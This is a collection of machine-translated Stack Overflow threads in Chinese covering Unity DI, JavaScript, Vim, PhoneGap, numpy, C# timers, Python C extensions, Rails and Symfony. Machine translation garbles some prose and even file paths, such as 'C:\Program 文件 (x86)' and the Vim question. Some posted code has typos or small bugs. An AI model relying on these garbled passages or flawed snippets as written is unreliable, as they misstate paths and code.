I used to do that as described in the answer above (that's using `InjectionConstructor`). The problem with that is that if the signature of the constructor is changed but `InjectionConstructor` is not updated, then we will know that only at run time. I think that there is a cleaner way to do that and without getting deep into details of the signature of the constructor. Here is how:

```
public interface IBar
{
    void DoSomethingWithBar();
}

public interface IMyStringPrameterForBar
{
    string Value { get; }
}

public class MyStringPrameterForBar : IMyStringPrameterForBar
{
    public string Value { get; }
    public MyStringPrameterForBar(string value) => Value = value; 
}

public class Bar : IBar
{
    public Bar(IFoo foo, IFoo2 foo2, IFoo3 foo3, IFooN fooN, IMyStringPrameterForBar text)
    {
    }

    public void DoSomethingWithBar() {}
} 
```

Then when registering interfaces, just add:

```
unity.RegisterType<IFoo, Foo>();
unity.RegisterType<IFoo2, Foo2>();
unity.RegisterType<IFooN, FooN>();
unity.RegisterInstance(new MyStrignPrameterForBar("123"));
unity.RegisterType<IBar, Bar>(); 
```

That's all. if tomorrow `Bar` needs to take more or less parameters, then after adding or removing extra `Foo<N + 1>` Unity will still automatically construct `Bar`.

PS I don't think that interface `IMyStringPrameterForBar` is actually required. However, I prefer to see only interfaces in Unity registrations because it is much easier to twist them around during tests and/or for any other purpose.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-05-10T00:15:06.163

```
public void Register<TFrom>(params object[] constructorParams) where TFrom : class
        {
            _container.RegisterType<TFrom>(new InjectionConstructor(constructorParams));
        } 
```

# javascript - 使用 Function 构造函数创建的函数的内部引用

> ID：11866647
> 
> 赞同：2
> 
> 时间：2012-08-08T14:24:22.290
> 
> 标签：javascript, ecmascript-5

我正在做一些元编程，使用[`Function`构造](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function)函数从组装的字符串中创建一个函数。

构造`Function`函数允许指定参数名称和主体，但似乎没有任何方法可以指定函数的名称。

这意味着似乎没有办法以符合标准的方式从自身内部引用函数（`arguments.callee`在 ES5 中已弃用，在严格模式下被禁止）。如果我正在编写一个文字函数语句，我可以这样做：

```
function myFunc(a, b, c) {
   if (c) {
      return myFunc(a, b);
   }
   return 0;
} 
```

如果我使用`Function()`（不使用`eval()`）构建该功能，有什么方法可以实现这种效果？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:28:50.873

如果你目前正在做这样的事情：

```
var f = new Function( argName, stringContainingCode ); 
```

那么你可以改为：

```
var f = new Function( "return function " + functionName + "(" + argName + ") { " + stringContainingCode + "}")(); 
```

换句话说，在一个包装器内构建函数，该包装器使用给定的名称返回它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:29:18.407

使变量等于您的新功能

```
var myFunc = new Function( x, "return 2 * x ") ; 
```

然后，您可以像往常一样使用引用该功能

```
myFunc(7) ; // returns, like, 9 or something 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:29:27.047

内部命名函数怎么样？

```
function myFunc(a, b, c) {
    return (function _myFunc(a, b, c) {
        if (c) {
            return _myFunc(a, b);
        }
        return 0;
    })(a, b, c);
} 
```

# javascript - 测试 JavaScript Zombie 事件处理程序或 DOM 元素

> ID：11866649
> 
> 赞同：2
> 
> 时间：2012-08-08T14:24:29.383
> 
> 标签：javascript, testing, backbone.js, single-page-application

在我最近从事的一个项目（BackboneJS 单页 web 应用程序）中，我遇到了奇怪的行为，可能是由于[僵尸处理程序](http://lostechies.com/derickbailey/2011/09/15/zombies-run-managing-page-transitions-in-backbone-apps/)和一些[陈旧的元素异常](http://seleniumhq.org/exceptions/stale_element_reference.html)（僵尸 DOM 元素）。我想知道是否有任何方法可以轻松检测到这些错误中的任何一个？

我现在更喜欢在 NodeJS 平台上开发。所以 Mocha 和 ZombieJS 用于测试，Express/Mongoose/Backbone（如果重要的话）

* * *

**更新**

@DerickBailey：我想知道是否有任何自动化工具可用于检测此类问题？目前，我只有在遇到问题时才找到它们。我正在寻找可以检测到此类问题的东西，如果可能的话，无需我的干预，例如。如果我需要写一个测试，我可能会错过一些东西。也就是说，如果可能的话

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-09T02:19:55.767

我没有使用它，但是从 Google 发现了这个项目[-leak-finder-for-javascript](https://code.google.com/p/leak-finder-for-javascript/)。

希望能帮助到你！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-09T02:37:47.927

我能想到的唯一真正的选择是将 addEventListener 和 removeEventListener 存储到 Window.prototype 的其他属性中（我只是假设这是所有其他 add/removeEventListener 继承的地方），然后覆盖原件，以便您可以将 ID 附加到事件绑定元素用于跟踪已删除或尚未删除的内容，并将 eventListener 参数传递给您的替代品，并在您执行 id 附加/分离/跟踪 voodoo 之后传递 args 并触发您的替代品。

我不建议在生产中以这种方式保留 add 和 removeEventListener 。使其成为某种调试模式的一部分。

# vim - 在 Vim 中添加自定义文件类型

> ID：11866650
> 
> 赞同：2
> 
> 时间：2012-08-08T14:24:30.097
> 
> 标签：vim, file-type

我想创建一个自定义`ft`，其中包含`c`语法突出显示和取决于行首字符的突出显示。

假设我打电话给新的分机`.mib`。我可以补充：

```
syntax on
filetype on
au BufNewFile,BufRead *.mib set filetype=c* 
```

显示文件`c`的语法突出显示`.mib`。

如果在同一个源文件中同时存在另一组其他语言的代码，这些代码以`@@`.

如果前面的行是 undefined 的一部分，如何区分[可能使用与突出显示不同的颜色`c`]这些行保持代码突出显示其余代码？`c``ft`

`@@`如果前置行是已定义的一部分，如何包含双重语法高亮`ft`？

我也知道

```
:setfiletype html.c 
```

对于双重突出显示，但我对突出显示前置行特别感兴趣。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T15:32:57.240

如果您自己的 autocmd 对您运行良好，您可以使用另一个为您的新扩展定义新的语法匹配：

```
au BufNewFile,BufRead *.mib syn match Error "@@.*" 
```

这将使用c.vim 语法文件中定义的突出显示从每次出现`@@`直到该行的末尾突出显示。`Error`

您可以使用任何现有的突出显示组，或定义自己的：

```
au ColorScheme * hi mibHighlight guibg=red gui=italic 
au BufNewFile,BufRead *.mib hi syn match mibHighlight "@@.*" 
```

# android - PhoneGap 应用程序未在 Android 模拟器中运行

> ID：11866651
> 
> 赞同：3
> 
> 时间：2012-08-08T14:24:30.857
> 
> 标签：android, cordova, sdk, android-emulator

我正在尝试构建/运行 PhoneGap 2.0 示例应用程序 (\Phonegap 2.0\lib\android\example)。我已将应用程序导出到 .apk 文件并安装在移动设备上。这适用于实际的移动设备，但不适用于 Android 模拟器。我只是看不到应用程序图标以启动应用程序。我查看了主屏幕和应用程序部分。我尝试过锁定和解锁模拟器之类的东西，但没有任何效果。

我在 D:\Eclipse 3.7.2 上创建了一个 Eclipse 工作区，并通过 Eclipse 从 \Phonegap 2.0\lib\android\example 文件夹创建了一个 Android 项目表单现有代码。

1.  视窗 7 64 位
2.  JAVA SDK - jdk-7u5-windows-i586.exe (32Bit)。安装如下所示：
    *   C:\Program 文件 (x86)\Java\jdk1.7.0_05
    *   C:\Program 文件 (x86)\Java\jre7\
    *   我必须重命名 Android SDK 的 C:\Program Files (x86)\Java\jre7\ 文件夹中的 java.exe，才能在 C:\Program Files (x86)\Java\jdk1.7.0_05 中找到 java.exe文件夹。即使我将名为 JAVA_HOME 的环境变量设置为 C:\Program Files (x86)\Java\jdk1.7.0_05\bin\java.exe，我也必须这样做
3.  Android SDK - 安装在机器上的 android-sdk_r20.0.1-windows（不是通过 zip 文件提取的）。
4.  通过 Android SDK Manager 安装以下内容：
    *   工具
        *   Android SDK 工具
        *   Android SDK 平台工具
    *   安卓 4.0.3 (API 15)
        *   Android SDK 文档
        *   SDK平台
        *   SDK 示例
        *   ARM EABI v7a 系统映像
        *   谷歌 API
        *   Android SDK 的源代码
    *   附加功能
        *   Android 支持库
        *   谷歌 USB 驱动程序
5.  通过具有以下属性的 Android 虚拟设备管理器创建 AVD：
    *   目标 - Android 4.0.3 - API 级别 15
    *   CPU/ABI - ARM (armeabi-v7a)
    *   SD 卡大小 - 128 MB
    *   内置 - WVGA800
6.  Eclipse IDE - Eclipse Indigo Classic 3.7.2 (eclipse-SDK-3.7.2-win32).zip
7.  Eclipse ADT 插件 20.0.2
8.  PhoneGap 2.0.0.zip

我被要求运行该应用程序两次。第一次它给了我一个错误。下次它运行并显示模拟器。

日志显示：

```
[2012-08-08 19:26:10 - org.apache.cordova.example.cordovaExample] ------------------------------
[2012-08-08 19:26:10 - org.apache.cordova.example.cordovaExample] Android Launch!
[2012-08-08 19:26:10 - org.apache.cordova.example.cordovaExample] The connection to adb is down, and a severe error has occured.
[2012-08-08 19:26:10 - org.apache.cordova.example.cordovaExample] You must restart adb and Eclipse.
[2012-08-08 19:26:10 - org.apache.cordova.example.cordovaExample] Please ensure that adb is correctly located at 'C:\Program Files (x86)\Android\android-sdk\platform-tools\adb.exe' and can be executed.
[2012-08-08 19:26:25 - org.apache.cordova.example.cordovaExample] ------------------------------
[2012-08-08 19:26:25 - org.apache.cordova.example.cordovaExample] Android Launch!
[2012-08-08 19:26:25 - org.apache.cordova.example.cordovaExample] adb is running normally.
[2012-08-08 19:26:25 - org.apache.cordova.example.cordovaExample] Performing org.apache.cordova.example.cordovaExample activity launch
[2012-08-08 19:26:25 - org.apache.cordova.example.cordovaExample] Automatic Target Mode: launching new emulator with compatible AVD 'MyAVD4.0.3'
[2012-08-08 19:26:25 - org.apache.cordova.example.cordovaExample] Launching a new emulator with Virtual Device 'MyAVD4.0.3' 
```

请帮忙！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:48:37.080

请确保 adb 位置正确。 adb 工具已移至 platform-tools/

如果您在 SDK 中没有看到此目录，请启动 SDK 和 AVD Manager（执行 android 工具）并安装“Android SDK Platform-tools”。遵循[本](http://www.mycodeland.com/?p=159)教程。

# python - 如何在python中获得二维直方图的每个bin中的最大值

> ID：11866654
> 
> 赞同：1
> 
> 时间：2012-08-08T14:24:43.443
> 
> 标签：python, numpy

我正在使用 numpy，尤其是 histrogram2d 函数。我正在使用 2d 直方图对点（数组 和 ）`x`的`y`3D空间分布进行分箱。`z`对于每个点，我都有一个相关的密度场`d`。

如果我做这样的事情

```
import numpy as np
H, xedges, yedges = np.histogram2d(x,y,bins=200,weights=d) 
```

直方图`H`表示沿视线的密度之和（在本例中为 z 轴）。考虑到我正在使用非常大的数组，这非常快速和容易。

现在我想更进一步，而不是沿着视线绘制密度总和，我想获得每个 2D bin 中的最大密度。我编写了可能的解决方案：

```
from numpy import *
x=array([0.5,0.5,0.2,0.3,0.2,0.25,0.35,0.6,0.1,0.22,0.7,0.45,0.57,0.65])
y=array([0.5,0.5,0.28,0.18,0.85,0.9,0.44,0.7,0.1,0.22,0.7,0.45,0.54,0.65])
d=array([1,1,2,2,3,5,6,8,7,9,6,10,5,7])

bins=linspace(0,1,64)

idx=digitize(x,bins) 
idy=digitize(y,bins) 

img2=zeros((len(bins),len(bins)))

for i in arange(0,len(d)):
  dummy=idx[i]
  dummy2=idy[i]
  img2[dummy][dummy2]=max(d[i],img2[dummy][dummy2]) 
```

然而，对于一个巨大的数据集，最后几行的循环可能真的很慢。关于如何让它更快的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-09T17:34:21.787

以下是我的做法，抱歉，我现在没有时间编写代码：

1.  用于`numpy.ravel_multi_index`将 2d 问题转化为 1d 问题。
2.  看一下 的实现`numpy.unique`，您想做类似的事情来获得唯一的 bin 值，但是您希望以这样的方式进行操作，以便同时为您提供最小值/最大值`d`。`numpy.lexsort`在这里也可能有所帮助。
3.  回到二维空间应该很简单`img2.flat[uniq_1d_bin_value] = bin_max`

我希望这足以让你开始。如果您遇到问题，您可以发布您的代码并让我们知道您在哪里卡住了，也许我或其他人可以帮助您再次走上正确的道路。

# c# - C# 计时器和/或锁用于更新仪表板小部件

> ID：11866659
> 
> 赞同：0
> 
> 时间：2012-08-08T14:24:57.163
> 
> 标签：c#, asp.net, multithreading, timer, signalr

我正在 ASP.NET 环境中使用 SignalR 构建具有多个小部件的实时仪表板。在所有小部件都加载了它们的默认数据后，每个小部件都需要独立更新其数据。这意味着我正在使用多个计时器来更新他们的数据，这些数据来自数据库。

现在我的问题是在上述情况下使用计时器的最佳方法是什么，以及如何确保它是线程安全的

这是我现在使用的代码：

```
public static void Init(){      

    Stopwatch.Start();

    _timer = new Timer(_ =>
    {
        if (_updating)
        {
            return;
        }
        _updating = true;

        try
        {
            var timeDiffSecs = Stopwatch.Elapsed.TotalSeconds;
            Stopwatch.Restart();

            if (timeDiffSecs <= 0)
            {
                return;
            }

            //DoMyActionForUpdate
        }
        finally
        {
            _updating = false;
        }
    }, null, TimeSpan.FromSeconds(3), TimeSpan.FromSeconds(3));
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T15:51:31.927

两者都使用线程池线程调用事件`System.Timers.Timer`和回调（分别）。（您没有详细说明您正在使用哪个）这意味着它将（或至少可能）在与任何其他计时器不同的线程上运行。这就像您启动多个线程一样——您需要使这些例程成为线程安全的。`System.Threading.Timer``Elapsed`

不管这些线程是如何开始的，技术都是一样的。任何可以在不能原子访问的线程之间共享的数据都需要与其他线程同步。这通常使用`lock`关键字来完成。您没有提供任何似乎使用任何共享数据的代码；但是，您确实提到了对数据库的访问。如果您有与数据库的共享连接，则必须确保一次只有一个线程使用该连接。例如：

```
lock(locker)
{
        SqlCommand command = new SqlCommand(queryString, connection);
        command.ExecuteNonQuery();}
} 
```

这显示了一个名为“locker”的字段的使用。您需要创建这个（只是一个`Object`）并在所有正在运行的线程中共享它。

如果您提供有关您正在做的事情的更多详细信息，特别是；有人可能能够提供更详细的答案。

# python - 在构造函数中获取列表的 Python 对象扩展永远不会通过创建步骤（SIGSEV），为什么？

> ID：11866660
> 
> 赞同：0
> 
> 时间：2012-08-08T14:25:11.980
> 
> 标签：python, numpy, segmentation-fault, python-c-api, python-c-extension

我一直在与一个错误作斗争，但我对正在发生的事情以及为什么它不起作用没有任何想法。

首先，我试图通过 C 扩展为 Python 创建一个新的对象类型。该对象是使用列表、numpy 数组等创建的……但我什至无法使这部分工作。

失败的实际最小代码是：

```
 #include <python2.7/Python.h>
    #include <python2.7/structmember.h>
    #include <numpy/arrayobject.h>
    #include "../python/NumpyHelperFuncs.h"
    #include <cmath>
    #include <algorithm>
    #include <iostream>
    using namespace std;

    typedef struct {
        PyObject_HEAD
    } CondensedMatrix;

    static void condensedMatrix_dealloc(CondensedMatrix* self){
        self->ob_type->tp_free((PyObject*)self);
    }

    static PyObject* condensedMatrix_new(PyTypeObject *type, PyObject *args, PyObject *kwds){
        CondensedMatrix *self;
        self = (CondensedMatrix*) type->tp_alloc(type, 0);
        return (PyObject *) self;
    }

    static int condensedMatrix_init(CondensedMatrix *self, PyObject *args, PyObject *kwds){
        PyObject* input;
        PyArrayObject* rmsd_numpy_array;
        cout<<"Minimum class creation"<<flush<<endl;

        if (! PyArg_ParseTuple(args, "O",&input)){
            PyErr_SetString(PyExc_RuntimeError, "Error parsing parameters.");
            return -1;
        }
        rmsd_numpy_array = (PyArrayObject *) PyArray_ContiguousFromObject(input, PyArray_FLOAT, 1, 1);
        Py_DECREF(rmsd_numpy_array);
        return 0;
    }

    static PyMemberDef condensedMatrix_members[] = {
        {NULL}  /* Sentinel */
    };

    static PyMethodDef condensedMatrix_methods[] = {
        {NULL}  /* Sentinel */
    };

    static PyTypeObject CondensedMatrixType = {
        PyObject_HEAD_INIT(NULL)
        0,                                              /*ob_size*/
        "condensedMatrix.CondensedMatrixType",          /*tp_name*/
        sizeof(CondensedMatrix),    /*tp_basicsize*/
        0,                         /*tp_itemsize*/
        (destructor)condensedMatrix_dealloc, /*tp_dealloc*/
        0,                         /*tp_print*/
        0,                         /*tp_getattr*/
        0,                         /*tp_setattr*/
        0,                         /*tp_compare*/
        0,                         /*tp_repr*/
        0,                         /*tp_as_number*/
        0,                         /*tp_as_sequence*/
        0,                         /*tp_as_mapping*/
        0,                         /*tp_hash */
        0,                         /*tp_call*/
        0,                         /*tp_str*/
        0,                         /*tp_getattro*/
        0,                         /*tp_setattro*/
        0,                         /*tp_as_buffer*/
        Py_TPFLAGS_DEFAULT| Py_TPFLAGS_BASETYPE ,                       /*tp_flags*/
        "Condensed matrix as in pdist",         /* tp_doc */
        0,                     /* tp_traverse */
        0,                     /* tp_clear */
        0,                     /* tp_richcompare */
        0,                     /* tp_weaklistoffset */
        0,                         /* tp_iter */
        0,                         /* tp_iternext */
        condensedMatrix_methods,   /* tp_methods */
        condensedMatrix_members,   /* tp_members */
        0,                         /* tp_getset */
        0,                         /* tp_base */
        0,                         /* tp_dict */
        0,                         /* tp_descr_get */
        0,                         /* tp_descr_set */
        0,                         /* tp_dictoffset */
        (initproc)condensedMatrix_init, /* tp_init */
        0,                              /* tp_alloc */
        condensedMatrix_new,                /* tp_new */
    };

    #ifndef PyMODINIT_FUNC  /* declarations for DLL import/export */
    #define PyMODINIT_FUNC void
    #endif

    PyMODINIT_FUNC initcondensedMatrix(void){
        PyObject* module;

        if (PyType_Ready(&CondensedMatrixType) < 0)
            return;

        module = Py_InitModule3("condensedMatrix", NULL,"Fast Access Condensed Matrix");
        if (module == NULL)
              return;

        Py_INCREF(&CondensedMatrixType);
        PyModule_AddObject(module, "CondensedMatrix", (PyObject*) &CondensedMatrixType);
    } 
```

此代码是按照提示（和复制/粘贴）编写的：http: [//docs.python.org/extending/newtypes.html](http://docs.python.org/extending/newtypes.html#id2)

我已经测试了 Noddy 代码并且它可以工作，但是如果我添加第四个参数来获取列表，它也会以 sigsev 退出。

我编译上面的代码：

```
gcc -pthread -fno-strict-aliasing -fmessage-length=0 -O2 -Wall -D_FORTIFY_SOURCE=2 -fstack-protector -funwind-tables -fasynchronous-unwind-tables  -fPIC  -c matrix.cpp

g++ -pthread -shared matrix/matrix.o -lpython2.7 -o condensedMatrix.so -fopenmp 
```

我使用它： if **name** == ' **main** ': data_con = [3,4,5,6] matrix = CondensedMatrix(data_con)

我还阅读[了 CApi 中的 PyArg_ParseTuple SegFaults](https://stackoverflow.com/questions/7760658/pyarg-parsetuple-segfaults-in-capi)

有谁知道为什么在 pyarg_parsetuple 之后会出现段错误？

Ubuntu 12.04、gcc 4.6.3、Python 2.7.3

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T13:53:44.537

因此，看起来该错误确实很容易解决，因为唯一需要的是缺少“import_array();” init函数中的语句：

```
PyMODINIT_FUNC initcondensedMatrix(void){
    PyObject* module;

    if (PyType_Ready(&CondensedMatrixType) < 0)
        return;

    module = Py_InitModule3("condensedMatrix", NULL,"Fast Access Condensed Matrix");
    if (module == NULL)
          return;

    Py_INCREF(&CondensedMatrixType);
    PyModule_AddObject(module, "CondensedMatrix", (PyObject*) &CondensedMatrixType);
    import_array();
} 
```

仅此而已...

# javascript - 不同浏览器的 HTML

> ID：11866662
> 
> 赞同：0
> 
> 时间：2012-08-08T14:25:15.100
> 
> 标签：javascript, html, internet-explorer

有没有办法根据用户的浏览器使用不同的代码？例如，如果用户使用的是 Internet Explorer，是否有某种方法可以传递与用户使用 Chrome 不同的代码？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:26:23.373

是的，有办法做到这一点。请查看条件评论：

[http://www.quirksmode.org/css/condcom.html](http://www.quirksmode.org/css/condcom.html)

和 CSS 黑客

[http://www.quirksmode.org/css/csshacks.html](http://www.quirksmode.org/css/csshacks.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:30:19.813

在大多数情况下，优选的方法是使用特征检测，即确定是否支持/不支持某个特征并采取相应措施。像[Modernizr](http://modernizr.com/)这样的库可以帮助检测功能并消除一些差异。

例如，检测“触摸”功能比查找移动浏览器用户代理字符串或版本要好得多。

实际上，对于特定于 IE 的问题使用条件注释通常是最容易的，因为 IE 支持它们，并且通常可以按浏览器版本对相关问题进行分组（与其他更容易特征检测的场景相比）。换句话说，在处理 Internet Explorer 时，您通常可以说“为所有 IE X 用户应用这些 hacks/fixes”。

[IE 10 中删除了](http://www.456bereastreet.com/archive/201110/no_more_conditional_comments_in_ie10/)对条件注释的支持。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T18:38:29.600

如果你想针对 IE

```
<!--[if IE]> -->
 <link rel="stylesheet" href="css/style.css"/>
<!--[endif]--> 
```

您可以通过以下命令在主 css 文件中使用简单的命令来定位 firefox：

```
 @-moz-document url-prefix() { 
  } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-08T14:26:41.907

当然。[http://en.wikipedia.org/wiki/Conditional_comment](http://en.wikipedia.org/wiki/Conditional_comment)

# ruby-on-rails - 使用管理命名空间时未初始化的常量 BaseController 错误

> ID：11866667
> 
> 赞同：2
> 
> 时间：2012-08-08T14:25:27.860
> 
> 标签：ruby-on-rails, ruby, routing, namespaces

我有一个这样的管理命名空间：

```
 namespace :admin do
    resources :users
    resources :base
  end 
```

具有以下目录结构：

```
/app/controllers/
        + admin
            - base_controller.rb
            - users_controller.rb
        - users_controller.rb
        - application_controller.rb 
```

我必须包含`admin/users_conroller.rb`一个`module Admin end`，否则我会得到一个`Uninitialized constant BaseController`错误：

```
class Admin::BaseController < ApplicationController
end

# Works fine
module Admin
  class UsersController < BaseController
  end
end

# Breaks with error
class Admin::UsersController < BaseController
end 
```

知道为什么会这样吗？使用 Rails 3.2。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-08T14:36:15.440

命名空间映射到目录，带下划线的文件名是驼峰式命名的类名。

```
class Some::DeeplyNested::BaseActionsController < ApplicationController 
```

需要在`app/controllers/some/deeply_nested/base_actions_controller.rb`轨道上找到它。

在您的代码中，没有`app/controllers/base_controller.rb`，所以`BaseController`在

```
class Admin::UsersController < BaseController 
```

指向 Rails 不知道的任何类。你需要给它管理命名空间*（因为你的 BaseController 的类定义也有）*

```
class Admin::UsersController < Admin::BaseController
end 
```

以上内容和您的问题中的工作代码是相同的

```
module Admin
  class UsersController < BaseController
  end
end 
```

# symfony1 - 在 symfony 1 中上传文件验证

> ID：11866669
> 
> 赞同：0
> 
> 时间：2012-08-08T14:25:30.930
> 
> 标签：symfony1, upload

我正在使用 symfony1.0 开发，我正在使用这样的文件验证（validate/upload.yml）：

```
 methods:
              post:               [logo_file]
              get:                [logo_file]

    names:
              logo_file:
              required:         Yes
              required_msg:     Please select a file to upload 23008
              validators:       myFileValidator
               file:             true

    myFileValidator:
              class:              sfFileValidator
              param:
                    mime_types:       
                            - 'image/jpeg'
                            - 'image/png'
                            - 'image/gif'
                            - 'image/x-png'
                            - 'image/pjpeg'    
    mime_types_error: Only PNG, GIF and JPEG images files are allowed 23009
    max_size:         512000
    max_size_error:   Max size is 512Kb 23010 
```

到目前为止一切都很好，但我还想对图像名称进行验证，我希望在输入数据库之前从无效字符中清除名称？

**编辑**

当然不是这样，现在我在 sving 在 DB 之前使用了一个函数：

```
 public static function generateUniqueName($fileName, $fileExtension)
{
    // Create a name 
    $fileUniqueSuffix=PublicIdGeneratorPeer::getPublicIdForTable(self::UNIQUE_FILE_ID);
    $finalFileName = $fileName.'-'.$fileUniqueSuffix.$fileExtension;

   //here I want to replace or remove invalid character from  $filename 

    return $finalFileName;
} 
```

**编辑-2**：

所以现在我有很多图像名称存储在数据库中，带有invlaid charater，所以我希望创建一个脚本或一种方法来传输feald“image_name”中的所有数据并直接更改数据库中的所有无效字符，我的第一个想法是使用“任务”？！任何想法？

**编辑-3**：

所以现在我像这样制作我的批次：

```
<?php
   define('SF_ROOT_DIR',    realpath(dirname(__FILE__).'/..'));
   define('SF_APP',         'backend');
   define('SF_ENVIRONMENT', 'prod');
    define('SF_DEBUG',       false);

   // symfony directories
      require_once(SF_ROOT_DIR.DIRECTORY_SEPARATOR.'apps'.DIRECTORY_SEPARATOR.SF_APP.DIRECTORY_SEPARATOR.'config'.DIRECTORY_SEPARATOR.'config.php');

     sfContext::getInstance();

 /********************************** Begin **********************************/

         $criteria = new Criteria();
           $listCompanyLogo = CompanyLogoPeer::doSelect($criteria);

         foreach($listCompanyLogo as $CompanyLogo)
      {
 if(!is_null($CompanyLogo))
       {

       $filename= $CompanyLogo->getFileName();
       $filepath=$CompanyLogo->getFilePath();
       $fileurl=$CompanyLogo->getFileUrl();

       $finalFileName=StringTool::stripText($filename);
       $finalFilePath=StringTool::cleanUrl($filename,$filepath);
       $finalFileUrl=StringTool::cleanUrl($filename,$fileurl);

       $CompanyLogo->setFileName($finalFileName);
       $CompanyLogo->setFilePath($finalFilePath);
       $CompanyLogo->setFileUrl($finalFileUrl);

       $CompanyLogo->save();

       echo ' the name of logo : '.$filename.' is modified by  ==============>'.$finalFileName.'<br>' ;
       exit();
       }

       }

         /********************************** End **********************************/
       ?> 
```

所以我可以从数据库中的文件名中更改无效字符，我的新问题是如何更改他的目录中的文件名，我的意思是更改文件本身的文件名，我不知道如何？

**编辑-4**

所以这是我的最终代码：

批处理/更新logoName.php

```
 <?php
   define('SF_ROOT_DIR',    realpath(dirname(__FILE__).'/..'));
   define('SF_APP',         'backend');
   define('SF_ENVIRONMENT', 'prod');
   define('SF_DEBUG',       false);

    // symfony directories
           require_once(SF_ROOT_DIR.DIRECTORY_SEPARATOR.'apps'.DIRECTORY_SEPARATOR.SF_APP.DIRECTORY_SEPARATOR.'config'.DIRECTORY_SEPARATOR.'config.php');

   sfContext::getInstance();

   /********************************** Begin **********************************/

   $criteria = new Criteria();
   $listCompanyLogo = CompanyLogoPeer::doSelect($criteria);

foreach($listCompanyLogo as $CompanyLogo)
 {
 if(!is_null($CompanyLogo))
       {

       $filename= $CompanyLogo->getFileName();
       $filepath=$CompanyLogo->getFilePath();
       $fileurl=$CompanyLogo->getFileUrl();
       $thumbnailName= $CompanyLogo->getThumbnailName();
       $ThumbnailPath= $CompanyLogo->getThumbnailPath();
       $ThumbnailUrl= $CompanyLogo->getThumbnailUrl();

       $finalFileName=StringTool::cleanName($filename);
       $finalFilePath=StringTool::cleanUrl($filename,$filepath);
       $finalFileUrl=StringTool::cleanUrl($filename,$fileurl);
       $finalThumbnailName=StringTool::cleanName($thumbnailName);
       $finalThumbnailPath=StringTool::cleanUrl($filename,$ThumbnailPath);
       $finalThumbnailUrl=StringTool::cleanUrl($filename,$ThumbnailUrl);

       $CompanyLogo->setFileName($finalFileName);
       $CompanyLogo->setFilePath($finalFilePath);
       $CompanyLogo->setFileUrl($finalFileUrl);
       $CompanyLogo->setThumbnailName($finalThumbnailName);
       $CompanyLogo->setThumbnailPath($finalThumbnailPath);
       $CompanyLogo->setThumbnailUrl($finalThumbnailUrl);

       $CompanyLogo->save();

       if(rename('../web/'.$ThumbnailUrl, '../web/'.$finalThumbnailUrl) !== 'false')
       {
             rename('../web/'.$ThumbnailUrl, '../web/'.$finalThumbnailUrl);
       }

       echo 'The logo : '.$filename.' is modified by ==============>'.$finalFileName.'<br>' ;

       }

 }

    /********************************** End **********************************/
  ?> 
```

类 StringTool.php ：

```
 public static function stripText($text)
    {
        $accFrom = array('ë','é','è','ê','Ê','Ë','É','È','à','â','á','ä','ã','å','Â','Å','À','Á','Ã','Ä','ç','Ç','Î','Ï','Ì','Í','ì','í','î','ï','Ó','Ô','Õ','Ö','ò','ó','ô','õ','ö','Ù','Ú','Û','Ü','ù','ú','û','ü');
        $accTo =   array('e','e','e','e','e','e','e','e','a','a','a','a','a','a','a','a','a','a','a','a','c','c','i','i','i','i','i','i','i','i','o','o','o','o','o','o','o','o','o','u','u','u','u','u','u','u','u');

        $text = str_replace($accFrom,$accTo,$text);

        $text = strtolower($text);

        // strip all non word chars
        $text = preg_replace('/\W/', ' ', $text);

        // replace all white space sections with a dash
        $text = preg_replace('/\ +/', '-', $text);

        // trim dashes
        $text = preg_replace('/\-$/', '', $text);
        $text = preg_replace('/^\-/', '', $text);

        return $text;
    }

     /*
     * Remove extnesion File
     * 
     */

     public static function RemoveExtension($fileName)
         {
            $extension = strrchr($fileName, '.');

            if($extension !== false)
              {
                $fileName = substr($fileName, 0, -strlen($extension));
              }
            return $fileName;
         }

     /*
     * Remove all non alpha-numeric characters from URLs and Files
     * 
     */

      public static function  cleanName ($fileName)
        {

         $extension = pathinfo($fileName, PATHINFO_EXTENSION);
         $extremove = self::RemoveExtension($fileName);
         $result = self::stripText($extremove);

         $finaleFileName= $result.'.'.$extension;

         return $finaleFileName;

        }

      public static function cleanUrl($fileName,$filePath)
        {

         $finaleFileName = self::cleanName($fileName);
         $finaleFilePath=str_replace($fileName, $finaleFileName, $filePath);

         return $finaleFilePath;
        } 
```

如果您看到任何错误或优化，请告诉我...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T15:32:18.720

您可以`generateUniqueName`使用 striptext 方法清理函数中的文件名。例如，在[Askeet](http://svn.askeet.com/trunk/lib/myTools.class.php)中使用的那个：

```
<?php

class myTools
{
  public static function stripText($text)
  {
    $text = strtolower($text);

    // strip all non word chars
    $text = preg_replace('/\W/', ' ', $text);

    // replace all white space sections with a dash
    $text = preg_replace('/\ +/', '-', $text);

    // trim dashes
    $text = preg_replace('/\-$/', '', $text);
    $text = preg_replace('/^\-/', '', $text);

    return $text;
  }
} 
```

然后：

```
public static function generateUniqueName($fileName, $fileExtension)
{
    // Create a name 
    $fileUniqueSuffix = PublicIdGeneratorPeer::getPublicIdForTable(self::UNIQUE_FILE_ID);
    $finalFileName    = myTools::stripText($fileName).'-'.$fileUniqueSuffix.$fileExtension;

    return $finalFileName;
} 
```

**编辑**：

对于您的第二个请求，您应该创建一个任务。其实它是一个任务，但是在sf1.0中它被称为*批处理。*请参阅[此处的简短文档](http://www.symfony-project.org/book/1_0/06-Inside-the-Controller-Layer#chapter_06_sub_batch_files)。基本上：

*   您获取所有图像表
